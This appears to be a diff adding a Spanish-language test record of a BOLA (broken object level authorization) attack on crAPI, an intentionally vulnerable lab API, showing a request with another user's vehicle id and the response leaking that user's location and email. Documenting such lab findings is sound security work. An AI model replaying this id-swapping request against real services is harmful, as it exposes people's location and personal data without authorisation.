@@ -1,0 +1,7 @@
+# BOLA: A cambia el id y consulta la ubicacion del vehiculo de B
+# 2026-11-03T00:11:43Z · crAPI · token oculto
+
+> GET /identity/api/v2/vehicle/7061a86e-44ed-4ba7-9bd2-10630fc8b2bf/location
+> Authorization: Bearer eyJhbG…[OCULTO]
+< HTTP 200
+{"carId":"7061a86e-44ed-4ba7-9bd2-10630fc8b2bf","vehicleLocation":{"id":4,"latitude":"38.206348","longitude":"-84.270172"},"fullName":"Usuario b","email":"usuariob@lab.local"}
